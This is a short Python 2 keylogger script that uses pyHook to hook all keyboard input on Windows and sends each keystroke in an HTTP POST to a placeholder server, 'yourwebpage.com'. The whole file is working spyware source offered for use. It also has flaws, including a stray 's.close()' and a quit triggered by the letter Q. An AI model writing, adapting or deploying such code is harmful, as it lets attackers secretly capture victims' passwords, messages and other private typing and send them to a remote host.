import pyHook
import pythoncom
import requests 



def onKeyboardEvent(event):
    if  event.Ascii == 13:
        key = "<ENTER>"
    elif event.Ascii == 27:
        key =  "<ESC>"
    elif event.Ascii == 8:
        key = "<BACKSPACE>"
    elif event.Ascii == 32:
        key = " <SPACE> "
    elif event.Ascii == 81:
        quit()
    elif event.Ascii == 17:
        key = "<CTRL>"
    elif event.Ascii == 9:
        key = "<TAB>"
    elif event.Ascii == 20:
        key = "<CAPSLOCK>"
    elif event.Ascii == 16:
        key = "<SHIFT>"
    elif event.Ascii == 18:
        key = "<ALT>"
    else:
        key = chr(event.Ascii)
        print key
    resp = requests.post("http://yourwebpage.com?keylog="+str(key))
    return True
 
hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=onKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
s.close()
